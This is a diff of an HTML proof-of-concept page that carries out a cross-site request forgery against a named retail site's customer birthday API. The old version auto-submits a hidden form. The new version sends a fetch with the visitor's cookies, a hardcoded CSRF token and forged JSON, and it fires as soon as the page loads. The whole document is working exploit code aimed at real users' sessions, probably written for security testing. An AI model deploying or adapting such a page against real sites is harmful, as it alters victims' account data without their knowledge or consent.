@@ -1,10 +1,18 @@
 <html>
   <body>
-    <form action="https://www.boozt.com/eu/en/api/customer/birthday" method="POST" enctype="application/json" id="csrfForm">
-      <input type="hidden" name='{"birthday":"1996-06-22"}'>
-    </form>
     <script>
-      document.getElementById('csrfForm').submit();
+      fetch("https://www.boozt.com/eu/en/api/customer/birthday", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json",
+          "X-Requested-With": "XMLHttpRequest",
+          "Csrf-Token": "76ee94f7a6f55bf620830ad1abf30fa6"  // if static or reused
+        },
+        body: JSON.stringify({
+          birthday: "1996-06-22"
+        })
+      });
     </script>
   </body>
 </html>
